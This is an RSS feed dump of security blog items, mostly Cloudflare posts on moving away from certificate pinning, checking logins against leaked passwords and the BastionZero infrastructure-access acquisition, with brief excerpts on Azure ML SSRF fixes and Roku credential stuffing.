          &lt;p&gt;Originally, certificate pinning was designed to prevent &lt;a href="https://blog.cloudflare.com/monsters-in-the-middleboxes/"&gt;monster-in-the-middle (MITM)&lt;/a&gt; attacks by associating a hostname with a specific TLS certificate, ensuring that a client could only access an application if the server presented a certificate issued by the domain owner.&lt;/p&gt;&lt;p&gt;Certificate pinning was traditionally used to secure IoT (Internet of Things) devices, mobile applications, and APIs. IoT devices are usually equipped with more limited processing power and are oftentimes unable to perform software updates. As a result, they’re less likely to perform things like certificate revocation checks to ensure that they’re using a valid certificate. As a result, it’s common for these devices to come pre-installed with a set of trusted certificate pins to ensure that they can maintain a high level of security. However, the increased frequency of certificate changes poses significant risk, as many devices have immutable software, preventing timely updates to certificate pins during renewals.&lt;/p&gt;&lt;p&gt;Similarly, certificate pinning has been employed to secure Android and iOS applications, ensuring that only the correct certificates are served. Despite this, both &lt;a href="https://developer.apple.com/news/?id=g9ejcf8y"&gt;Apple&lt;/a&gt; and &lt;a href="https://developer.android.com/privacy-and-security/security-ssl"&gt;Google&lt;/a&gt; warn developers against the use of certificate pinning due to the potential for failures if not implemented correctly.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Understanding the trade-offs of different certificate pinning implementations&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#understanding-the-trade-offs-of-different-certificate-pinning-implementations"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;While certificate pinning can be applied at various levels of the certificate chain, offering different levels of granularity and security, we don’t recommend it due to the challenges and risks associated with its use.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Pinning certificates at the root certificate&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#pinning-certificates-at-the-root-certificate"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Pinning the root certificate instructs a client to only trust certificates issued by that specific Certificate Authority (CA).&lt;/p&gt;&lt;p&gt;&lt;b&gt;Advantages&lt;/b&gt;:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Simplified management:&lt;/b&gt; Since root certificates have long lifetimes (&amp;gt;10 years) and rarely change, pinning at the root reduces the need to frequently update certificate pins, making this the easiest option in terms of management overhead.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Disadvantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Broader trust:&lt;/b&gt; Most Certificate Authorities (CAs) issue their certificates from one root, so pinning a root CA certificate enables the client to trust every certificate issued from that CA. However, this broader trust can be problematic. If the root CA is compromised, every certificate issued by that CA is also compromised, which significantly increases the potential scope and impact of a security breach. This broad trust can therefore create a single point of failure, making the entire ecosystem more vulnerable to attacks.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Neglected Maintenance:&lt;/b&gt; Root certificates are infrequently rotated, which can lead to a “set and forget” mentality when pinning them. Although it's rare, CAs do &lt;a href="https://letsencrypt.org/2023/07/10/cross-sign-expiration.html"&gt;change their roots&lt;/a&gt; and when this happens, a correctly renewed certificate will break the pin, causing an outage. Since these pins are rarely updated, resolving such outages can be time-consuming as engineering teams try to identify and locate where the outdated pins have been set.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Pinning certificates at the intermediate certificate&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#pinning-certificates-at-the-intermediate-certificate"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Pinning an intermediate certificate instructs a client to only trust certificates issued by a specific intermediate CA, issued from a trusted root CA. With lifetimes ranging from 3 to 10 years, intermediate certificates offer a better balance between security and flexibility.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Advantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Better security:&lt;/b&gt; Narrows down the trust to certificates issued by a specific intermediate CA.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Simpler management:&lt;/b&gt; With intermediate CA lifetimes spanning a few years, certificate pins require less frequent updates, reducing the maintenance burden.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Disadvantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Broad trust:&lt;/b&gt; While pinning on an intermediate certificate is more restrictive than pinning on a root certificate, it still allows for a broad range of certificates to be trusted.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Maintenance:&lt;/b&gt; Intermediate certificates are rotated more frequently than root certificates, requiring more regular updates to pinned certificates.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Less predictability:&lt;/b&gt; With CAs like Let’s Encrypt issuing their certificates from varying intermediates, it’s no longer possible to predict which certificate chain will be used during a renewal, making it more likely for a certificate renewal to break a certificate pin and cause an outage.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h3&gt;Pinning certificates at the leaf certificate&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#pinning-certificates-at-the-leaf-certificate"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Pinning the leaf certificate instructs a client to only trust that specific certificate. Although this option offers the highest level of security, it also poses the greatest risk of causing an outage during a certificate renewal.&lt;/p&gt;&lt;p&gt;&lt;b&gt;Advantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;High security:&lt;/b&gt; Provides the highest level of security by ensuring that only a specific certificate is trusted, minimizing the risk of a monster-in-the-middle attack.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Disadvantages:&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Risky:&lt;/b&gt; Requires careful management of certificate renewals to prevent outages.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Management burden:&lt;/b&gt; Leaf certificates have shorter lifetimes, with 90 days becoming the standard, requiring constant updates to the certificate pin to avoid a breaking change during a renewal.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h2&gt;Alternatives to certificate pinning&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#alternatives-to-certificate-pinning"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Given the risks and challenges associated with certificate pinning, we recommend the following as more effective and modern alternatives to achieve the same level of security (preventing a mis-issued certificate from intercepting traffic) that certificate pinning aims to provide.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Shorter certificate lifetimes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#shorter-certificate-lifetimes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Using shorter certificate lifetimes ensures that certificates are regularly renewed and replaced, reducing the risk of misuse of a compromised certificate by limiting the window of opportunity for attackers.&lt;/p&gt;&lt;p&gt;By default, Cloudflare issues 90-day certificates for customers. Customers using Advanced Certificate Manager can request TLS certificates with lifetimes as short as 14 days.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;CAA records to restrict which CAs can issue certificates for a domain&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#caa-records-to-restrict-which-cas-can-issue-certificates-for-a-domain"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;&lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/caa-records/"&gt;Certification Authority Authorization&lt;/a&gt; (CAA) DNS records allow domain owners to specify which CAs are allowed to issue certificates for their domain. This adds an extra layer of security by restricting issuance to trusted authorities, providing a similar benefit as pinning a root CA certificate. For example, if you’re using Google Trust Services as your CA, you can add the following CAA DNS record to ensure that only that CA issues certificates for your domain:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;example.com         CAA 0 issue "pki.goog"&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;By default, &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/caa-records/#caa-records-added-by-cloudflare"&gt;Cloudflare sets CAA records&lt;/a&gt; on behalf of customers to ensure that certificates can be issued from the CAs that Cloudflare partners with. Customers can choose to further restrict that list of CAs by adding their own CAA records.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Certificate Transparency &amp;amp; monitoring&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#certificate-transparency-monitoring"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Certificate Transparency (CT) provides the ability to monitor and audit certificate issuances. By logging certificates in publicly accessible CT logs, organizations are able to monitor, detect, and respond to misissued certificates at the time they are issued.&lt;/p&gt;&lt;p&gt;Cloudflare customers can set up &lt;a href="https://developers.cloudflare.com/ssl/edge-certificates/additional-options/certificate-transparency-monitoring/"&gt;CT Monitoring&lt;/a&gt; to receive notifications when certificates are issued in their domain. Today, we notify customers using the product about all certificates issued for their domains. In the future, we will allow customers to filter those notifications, so that they are only notified when an external party that isn’t Cloudflare issues a certificate for the owner’s domain. This product is available to all customers and can be enabled with the click of a button.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Multi-vantage point Domain Control Validation (DCV) checks to prevent mis-issuances&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#multi-vantage-point-domain-control-validation-dcv-checks-to-prevent-mis-issuances"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;For a CA to issue a certificate, the domain owner needs to prove ownership of the domain by serving Domain Control Validation (DCV) records. While uncommon, one attack vector of DCV validation allows an actor to perform BGP hijacking to spoof the DNS response and trick a CA into mis-issuing a certificate. To prevent this form of attack, CAs have started to perform DCV validation checks from multiple locations to ensure that a certificate is only issued when a full quorum is met.&lt;/p&gt;&lt;p&gt;Cloudflare has developed &lt;a href="https://blog.cloudflare.com/secure-certificate-issuance"&gt;its own solution&lt;/a&gt; that CAs can use to perform multi vantage point DCV checks. In addition, Cloudflare partners with CAs like Let’s Encrypt who continue to develop these checks to support &lt;a href="https://community.letsencrypt.org/t/lets-encrypt-is-adding-two-new-remote-perspectives-for-domain-validation/214123/3"&gt;new locations&lt;/a&gt;, reducing the risk of a certificate mis-issuance.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Specifying ACME account URI in CAA records&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#specifying-acme-account-uri-in-caa-records"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;A new enhancement to the &lt;a href="https://datatracker.ietf.org/doc/html/rfc8555"&gt;ACME protocol&lt;/a&gt; allows certificate requesting parties to specify an ACME account URI, the ID of the ACME account that will be requesting the certificates, in CAA records to tighten control over the certificate issuance process. This ensures that only certificates issued through an authorized ACME account are trusted, adding another layer of verification to certificate issuance. Let’s Encrypt &lt;a href="https://letsencrypt.org/docs/caa/"&gt;supports&lt;/a&gt; this extension to CAA records which allows users with a Let’s Encrypt certificate to set a CAA DNS record, such as the following:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;example.com         CAA 0 issue "letsencrypt.org;accounturi=https://acme-v02.api.letsencrypt.org/acme/acct/&amp;lt;account_id&amp;gt;"&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;With this record, Let’s Encrypt subscribers can ensure that only Let’s Encrypt can issue certificates for their domain and that these certificates were only issued through their ACME account.&lt;/p&gt;&lt;p&gt;Cloudflare will look to support this enhancement automatically for customers in the future.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Conclusion&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#conclusion"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Years ago, certificate pinning was a valuable tool for enhancing security, but over the last 20 years, it has failed to keep up with new advancements in the certificate ecosystem. As a result, instead of providing the intended security benefit, it has increased the number of outages caused during a successful certificate renewal. With new enhancements in certificate issuance standards and certificate transparency, we’re encouraging our customers and the industry to move towards adopting those new standards and deprecating old ones.&lt;/p&gt;&lt;p&gt;If you’re a Cloudflare customer and are required to pin your certificate, the only way to ensure a zero-downtime renewal is to upload your own custom certificates.

            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5E4xMAFZoPqfmTJ1o7lLLC/3d8d71e57002f0e653c0eb894e53a95e/image2-8.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;Password reuse is a real problem. When people use the same password across multiple services, it creates a risk that a breach of one service will give attackers access to a different, apparently unrelated, service. Attackers know people reuse passwords and build giant lists of known passwords and known usernames or email addresses.&lt;/p&gt;&lt;p&gt;If you got to the end of that paragraph and realized you’ve reused the same password multiple places, stop reading and go change those passwords. We’ll wait.&lt;/p&gt;&lt;p&gt;To help protect Cloudflare customers who have used a password attackers know about, we are releasing a feature to improve the security of the Cloudflare dashboard for all our customers by automatically checking whether their Cloudflare user password has appeared in an attacker's list. Cloudflare will securely check a customer’s password against threat intelligence sources that monitor data breaches in other services.&lt;/p&gt;&lt;p&gt;If a customer logs in to Cloudflare with a password that was leaked in a breach elsewhere on the Internet, Cloudflare will alert them and ask them to choose a new password.&lt;/p&gt;&lt;p&gt;For some customers, the news that their password was known to hackers will come as a surprise – no one wants to intentionally use passwords that they know have been leaked elsewhere. To help customers avoid being locked out when they urgently need to use their Cloudflare dashboard, the leaked password check will provide a warning to the customer for the first three login attempts. After those three attempts, Cloudflare will require that the customer reset their password.&lt;/p&gt;&lt;p&gt;Resetting a leaked password is just the first step in Internet account security. The best way to protect your Cloudflare account, or any account, is to add two-factor authentication, such as using a hardware security key or an authenticator application, or to rely on a single sign-on integration. Cloudflare makes it easy for any user to &lt;a href="https://developers.cloudflare.com/fundamentals/setup/account/account-security/2fa/#enable-two-factor-authentication-for-your-cloudflare-account"&gt;add two-factor authentication security to their account&lt;/a&gt; through app-based codes, hardware keys, or passkeys. Cloudflare account Super Administrators can also require that all members enable two-factor authentication.&lt;/p&gt;&lt;p&gt;Whether or not a user has been impacted in a data breach, we encourage everyone to add two-factor authentication security to their Cloudflare account.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How do credentials leak?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-do-credentials-leak"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Each time you authenticate to a service on the Internet with a username and password, that service can take a range of steps to protect your credentials.&lt;/p&gt;&lt;p&gt;More secure providers will hash the passwords. &lt;a href="https://www.authgear.com/post/password-hashing-salting#hashing"&gt;Hashing&lt;/a&gt; uses a cryptographic algorithm to convert the password into a random string of characters. Some platforms will layer on additional safeguards like a &lt;a href="https://www.authgear.com/post/password-hashing-salting#salting"&gt;salt&lt;/a&gt; mechanism that introduces a random value to each password before the hashing process to ensure that two identical passwords do not have identical hashes.&lt;/p&gt;&lt;p&gt;These protections, combined with rate limits on login attempts, prevent brute force attacks. However, even for providers that adopt these best practices, users can still become victims of determined attackers when bad actors gain access to breached password databases. Attackers can collect compromised email password pairs to gain access to user accounts elsewhere as part of targeted attacks.&lt;/p&gt;&lt;p&gt;When vendors discover these kinds of compromised accounts, in many cases they will quickly force a password reset. However, resetting a leaked password in one application can still leave you vulnerable in other applications if you reused that password in other places and do not change your credentials everywhere.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/410DAKcAIJaJmKI71DfN3L/71c68701609b8ead70dbdea2f37215fd/image3-13.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;That kind of password reuse means that an attacker can steal your credentials from one Internet service and try them against dozens of other popular destinations to see where you reuse the same password.&lt;/p&gt;&lt;p&gt;These so-called &lt;a href="https://www.cloudflare.com/learning/bots/what-is-credential-stuffing/"&gt;credential stuffing attacks&lt;/a&gt; have become more prevalent as breaches pile up. Attackers can sit on large troves of credentials for months or years, waiting to sell them to another bad actor or to use them in targeted attacks. For customers who want to protect themselves from these and other attacks that can compromise their end customer’s accounts, Cloudflare has solutions like &lt;a href="https://blog.cloudflare.com/account-takeover-protection/"&gt;bot management, exposed credential checks, and rate limiting&lt;/a&gt; available to help defend against these kinds of attacks&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How can customers protect against the impact of leaked credentials?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-can-customers-protect-against-the-impact-of-leaked-credentials"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;If every password you use is unique, then a data breach in one vendor will be limited to just that particular system. For that reason, we encourage users to adopt a password manager that can create and remember unique passwords for each service that you use. Thankfully, the most popular operating systems now include password managers by default, and multiplatform third party options also make it easy for users to adopt this practice.&lt;/p&gt;&lt;p&gt;However, unique passwords are still vulnerable to phishing attacks. The best way to protect any Internet account is to add two-factor authentication (2FA). Two-factor authentication provides a comprehensive defense against credential stuffing attacks. When using two-factor authentication to log in, you must use your password and, for example, a one-time code from an app or a tap on a physical hardware key. The password alone is not enough to access your account.&lt;/p&gt;&lt;p&gt;Adoption of two-factor authentication, specifically hardware keys, has been &lt;a href="https://www.microsoft.com/en-us/security/blog/2019/08/20/one-simple-action-you-can-take-to-prevent-99-9-percent-of-account-attacks/"&gt;shown to be able to eliminate 99.9% of account takeovers&lt;/a&gt;, since the attacker must also get access to your second factor in addition to your password. In the case of hardware keys, they need to physically obtain the key.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How does Cloudflare check for leaked credentials?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-does-cloudflare-check-for-leaked-credentials"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When a user attempts to log into Cloudflare, we will check if the password used has been leaked in a known data breach of another service or application on the Internet. We maintain data on breaches of Internet services that we can use to search against. Because we use password hashes, scrambled versions of the original password that can’t be easily reversed, we compare a hash of the password to hashes of compromised passwords found in these lists from other attacks. An additional benefit, beside the security of hashes, is the ability to perform fast lookups, much faster than plaintext searches. This means that we can perform these checks without adding significant latency to the login process for users.&lt;/p&gt;&lt;p&gt;Because of the potential impact of a Cloudflare account being compromised, we opt for a more secure approach of disallowing leaked credentials regardless of whether they were associated with the specific user’s email or not. Unfortunately, data breaches are likely to continue to happen. Therefore, being proactive helps reduce the risk of new breaches that contain the email and password pair allowing for an account to be compromised before the data is available to us.&lt;/p&gt;&lt;p&gt;If we detect a match, the user will be prompted with the following warning. We will also send an email notification with instructions on what to do and a unique link in order to reset the password.&lt;/p&gt;
            &lt;figure&gt;
            
            &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/bCm8LmZVjuGn70hDdjVT2/7c554325a98559d54ae2f5683f75090a/Screenshot-2024-06-24-at-10.16.02-AM.png" /&gt;
            
            &lt;/figure&gt;&lt;p&gt;At this point, the user will still be able to log in to their Cloudflare account. We strongly encourage users to reset their password immediately. However, we know that in some cases you need to reach the Cloudflare dashboard immediately or do not have convenient access to the email used for the account. Cloudflare will allow two additional login attempts to succeed with the same compromised password before forcing the user to reset their password.&lt;/p&gt;&lt;p&gt;To reset a password in Cloudflare Dashboard, navigate to the &lt;a href="https://dash.cloudflare.com/profile/authentication"&gt;&lt;b&gt;Authentication&lt;/b&gt; page&lt;/a&gt; in &lt;b&gt;My Profile&lt;/b&gt;. From here, select &lt;b&gt;Change Password&lt;/b&gt; and enter both the current password to authenticate and a new, non-compromised password. Alternatively, for those whose password was leaked, upon login an email will be sent with a unique link to reset the password.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s next?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-next"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Forcing users to reset compromised credentials helps prevent attacks from spreading on the Internet, but it’s just a small piece of improved account security. We know that adding the next step, second factor authentication, can be cumbersome. We have committed to &lt;a href="https://www.cisa.gov/securebydesign"&gt;CISA’s Secure by Design Pledge&lt;/a&gt;, which includes working to increase 2FA adoption across the industry. We will share our plans on how we will be implementing the pledge by mid-2025.&lt;/p&gt;&lt;p&gt;Adding multifactor authentication to every one of your accounts on the Internet can still be a chore, no matter how much the experience is improved. It’s much easier if you can just do it with one account and use that account to authenticate into other services and applications – a single-sign on (SSO) flow. Right now, our SSO feature is limited to enterprise accounts, and we plan to change that. We will allow users to access Cloudflare through other providers like Google, GitHub, and more. Allowing users to reduce how many unique password and 2FA combinations they have to keep track of helps to reduce the likelihood of being impacted by future password breaches.&lt;/p&gt;</content:encoded><guid isPermaLink="false">OEX1mcgZrCSgEplJZHr1h</guid><category>Passwords</category><category>Security</category></item><item><title>Mitigating SSRF Vulnerabilities Impacting Azure Machine Learning</title><link>https://msrc.microsoft.com/blog/2024/06/mitigating-ssrf-vulnerabilities-impacting-azure-machine-learning/</link><description>Summary On May 9, 2024, Microsoft successfully addressed multiple vulnerabilities within the Azure Machine Learning (AML) service, which were initially discovered by security research firms Wiz and Tenable.

This acquisition extends our Zero Trust Network Access (ZTNA) flows with native access management for infrastructure like servers, Kubernetes clusters, and databases.&lt;/p&gt;&lt;p&gt;Security teams often prioritize application and Internet access because these are the primary vectors through which users interact with corporate resources and external threats infiltrate networks. Applications are typically the most visible and accessible part of an organization's digital footprint, making them frequent targets for cyberattacks. Securing application access through methods like Single Sign-On (SSO) and Multi-Factor Authentication (MFA) can yield immediate and tangible improvements in user security.&lt;/p&gt;&lt;p&gt;However, infrastructure access is equally critical and many teams still rely on &lt;a href="https://www.cloudflare.com/learning/access-management/castle-and-moat-network-security/"&gt;castle-and-moat&lt;/a&gt; style network controls and local resource permissions to protect infrastructure like servers, databases, Kubernetes clusters, and more. This is difficult and fraught with risk because the security controls are fragmented across hundreds or thousands of targets. Bad actors are increasingly focusing on targeting infrastructure resources as a way to take down huge swaths of applications at once or steal sensitive data. We are excited to extend Cloudflare One’s Zero Trust Network Access to natively protect infrastructure with user- and device-based policies along with multi-factor authentication.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Application vs. infrastructure access&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#application-vs-infrastructure-access"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Application access typically involves interacting with web-based or client-server applications. These applications often support modern authentication mechanisms such as Single Sign-On (SSO), which streamline user authentication and enhance security. SSO integrates with identity providers (IdPs) to offer a seamless and secure login experience, reducing the risk of password fatigue and credential theft.&lt;/p&gt;&lt;p&gt;Infrastructure access, on the other hand, encompasses a broader and more diverse range of systems, including servers, databases, and network devices. These systems often rely on protocols such as SSH (Secure Shell), RDP (Remote Desktop Protocol), and Kubectl (Kubernetes) for administrative access. The nature of these protocols introduces additional complexities that make securing infrastructure access more challenging.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;SSH Authentication:&lt;/b&gt; SSH is a fundamental tool for accessing Linux and Unix-based systems. SSH access is typically facilitated through public key authentication, through which a user is issued a public/private key pair that a target system is configured to accept. These keys must be distributed to trusted users, rotated frequently, and monitored for any leakage. If a key is accidentally leaked, it can grant a bad actor direct control over the SSH-accessible resource.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;RDP Authentication:&lt;/b&gt; RDP is widely used for remote access to Windows-based systems. While RDP supports various authentication methods, including password-based and certificate-based authentication, it is often targeted by brute force and credential stuffing attacks.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Kubernetes Authentication:&lt;/b&gt; Kubernetes, as a container orchestration platform, introduces its own set of authentication challenges. Access to Kubernetes clusters involves managing roles, service accounts, and kubeconfig files along with user certificates.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h2&gt;Infrastructure access with Cloudflare One today&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#infrastructure-access-with-cloudflare-one-today"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare One facilitates &lt;a href="https://www.cloudflare.com/learning/access-management/what-is-ztna/"&gt;Zero Trust Network Access&lt;/a&gt; (ZTNA) for infrastructure resources with an approach superior to traditional VPNs. An administrator can define a set of identity, device, and network-aware policies that dictate if a user can access a specific IP address, hostname, and/or port combination. This allows you to create policies like “Only users in the identity provider group ‘developers’ can access resources over port 22 (default SSH port) in our corporate network,” which is already much finer control than a VPN with basic firewall policies would allow.&lt;/p&gt;&lt;p&gt;However, this approach still has limitations, as it relies on a set of assumptions about how corporate infrastructure is provisioned and managed. If an infrastructure resource is configured outside of the assumed network structure, e.g. SSH over a non-standard port is allowed, all network-level controls may be bypassed. This leaves only the native authentication protections of the specific protocol protecting that resource and is often how leaked SSH keys or database credentials can lead to a wider system outage or breach.&lt;/p&gt;&lt;p&gt;Many organizations will leverage more complex network structures like a bastion host model or complex Privileged Access Management (PAM) solutions as an added defense-in-depth strategy. However, this leads to significantly more cost and management overhead for IT security teams and sometimes complicates challenges related to least-privileged access. Tools like bastion hosts or PAM solutions end up eroding least-privilege over time because policies expand, change, or drift from a company’s security stance. This leads to users incorrectly retaining access to sensitive infrastructure.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How BastionZero fits in&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-bastionzero-fits-in"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;While our goal for years has been to help organizations of any size replace their VPNs as simply and quickly as possible, BastionZero expands the scope of Cloudflare’s VPN replacement solution beyond apps and networks to provide the same level of simplicity for extending Zero Trust controls to infrastructure resources. This helps security teams centralize the management of even more of their hybrid IT environment, while using standard Zero Trust practices to keep DevOps teams productive and secure. Together, Cloudflare and BastionZero can help organizations replace not only VPNs but also bastion hosts; SSH, Kubernetes, or database key management systems; and redundant PAM solutions.&lt;/p&gt;&lt;p&gt;BastionZero provides native integration to major infrastructure access protocols and targets like SSH, RDP, Kubernetes, database servers, and more to ensure that a target resource is configured to accept connections for that specific user, instead of relying on network level controls. This allows administrators to think in terms of resources and targets, not IP addresses and ports. Additionally, BastionZero is built on &lt;a href="https://github.com/openpubkey/openpubkey"&gt;OpenPubkey&lt;/a&gt;, an open source library that binds identities to cryptographic keys using OpenID Connect (OIDC). With OpenPubkey, SSO can be used to grant access to infrastructure.  BastionZero uses multiple roots of trust to ensure that your SSO does not become a single point of compromise for your critical servers and other infrastructure.&lt;/p&gt;&lt;p&gt;BastionZero will add the following capabilities to Cloudflare’s SASE platform:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;The elimination of long-lived keys/credentials&lt;/b&gt; through frictionless infrastructure privileged access management (PAM) capabilities that modernize credential management (e.g., SSH keys, kubeconfig files, database passwords) through a new ephemeral, decentralized approach.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;A DevOps-based approach for securing SSH connections&lt;/b&gt; to support least privilege access that records sessions and logs every command for better visibility to support compliance requirements. Teams can operate in terms of auto-discovered targets, not IP addresses or networks, as they define just-in-time access policies and automate workflows.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Clientless RDP&lt;/b&gt; to support access to desktop environments without the overhead and hassle of installing a client on a user’s device.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;div&gt;
            &lt;h2&gt;What’s next for BastionZero&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-next-for-bastionzero"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The BastionZero team will be focused on integrating their infrastructure access controls directly into Cloudflare One. During the third and fourth quarters of this year, we will be announcing a number of new features to facilitate Zero Trust infrastructure access via Cloudflare One. All functionality delivered this year will be included in the Cloudflare One free tier for organizations with less than 50 users. We believe that everyone should have access to world-class security controls.&lt;/p&gt;&lt;p&gt;We are looking for early beta testers and teams to provide feedback about what they would like to see with respect to infrastructure access.

&lt;p&gt;&lt;a href="http://en.wikipedia.org/wiki/Credential_stuffing"&gt;Credential stuffing&lt;/a&gt; is an attack in which usernames and passwords exposed in one leak are tried out against other accounts, typically using automated scripts. When people reuse usernames and passwords across services or make small, easily intuited changes between them, actors can gain access to accounts with even more identifying information and access.&lt;/p&gt;
&lt;p&gt;In the case of the Roku attacks, that meant access to stored payment methods, which could then be used to buy streaming subscriptions and Roku hardware. &lt;a href="https://www.roku.com/blog/protecting-your-roku-account"&gt;Roku wrote on its blog&lt;/a&gt;, and in &lt;a href="https://oag.ca.gov/system/files/Template%20Notification%203-8-2024.pdf"&gt;a mandated data breach report&lt;/a&gt;, that purchases occurred in "less than 400 cases" and that full credit card numbers and other "sensitive information" was not revealed.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2024/04/roku-forcing-2-factor-authentication-after-breach-of-600k-accounts/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

